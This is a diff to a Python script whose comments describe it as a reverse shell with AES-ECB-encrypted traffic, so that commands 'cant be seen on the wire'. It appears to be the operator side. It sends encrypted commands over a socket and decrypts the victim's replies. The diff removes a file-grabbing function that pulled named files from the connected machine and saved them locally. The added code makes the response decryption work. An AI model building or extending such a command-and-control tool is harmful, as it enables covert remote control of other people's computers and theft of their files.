@@ -6,6 +6,10 @@ import sys
 import binascii
 import Padding
 
+# Simple way to encrpt traffic so it cant be seen on the wire
+# Reverse shell using AES ECB
+# NOTE ECB is insecure as it repeats
+
 password='hello'
 ival=10
 
@@ -24,32 +28,6 @@ def decrypt(ciphertext,key, mode):
     encobj = AES.new(key,mode)
     return(encobj.decrypt(ciphertext))
 
-def transfer(conn, command):
-    print("Transfer File")
-    print(conn)
-    print(command)
-    print(command.encode())
-    #Send the command ie grab*test.txt to the client
-    conn.send(command.encode())
-
-    # Split out the path ie grab*text.txt will return 
-    grab, path = command.split("*")
-    print("The grab",grab)
-    print("The path is",path)
-
-    f=open("/home/tech/" +path, "wb") # Change this to suit your linux machine
-    while True:
-        bits = conn.recv(1024)
-        if bits.endswith("DONE".encode()):
-            f.write(bits[:-4])
-            f.close()
-            print("[+] Transfer completed")
-            break
-        if "File not found".encode() in bits:
-            print("[-] Unable to find oy the file")
-            break
-        f.write(bits)
-
 def connect():
     print("[+] - Attempting to connect to server connection...")
     s = socket.socket()
@@ -67,6 +45,8 @@ def connect():
               
         plaintext=command
         
+        #With ECB we have block made up og 16 bytes.  we need to pad the rest with null bytes
+        
         plaintext = Padding.appendPadding(plaintext,blocksize=Padding.AES_blocksize,mode=0)
         print("The plain text with padding added",plaintext)
         #print ("Input data (CMS): "+binascii.hexlify(plaintext.encode()).decode())
@@ -78,7 +58,19 @@ def connect():
         #conn.send(command.encode())
     
         conn.send(ciphertext)
-        print (conn.recv(1024).decode())
+        
+        cipherResponse = conn.recv(4096)
+        print("The respone encrypted",cipherResponse)
+        
+        # We now decrypt the text
+        responsePlaintext = decrypt(cipherResponse,key,AES.MODE_ECB)
+        #Remove all the padding
+        responsePlaintext = Padding.removePadding(responsePlaintext.decode(),mode=0)  
+        
+        #Response now in raw text 
+        print ("  decrypted: "+responsePlaintext)        
+        
+        
 def main():
       
     connect()
